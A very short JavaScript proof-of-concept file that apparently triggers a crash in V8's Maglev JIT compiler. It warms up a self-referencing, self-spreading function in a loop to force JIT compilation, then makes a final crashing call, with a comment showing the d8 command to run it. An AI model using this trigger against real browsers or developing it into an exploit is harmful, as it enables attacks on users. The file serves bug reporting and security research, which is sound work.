// Vulnerable Function
function f0(a1) {
    a1[5] = f0;
    try {
        f0(...f0, ...f0, ...f0);
    } catch(e) {}
}
// Force JIT
for (let v10 = 0; v10 < 250; v10++) {
    f0([]);
}
// Crash
f0(0xDEADBEEF+1 >> 1);
// ./d8 --maglev crash.js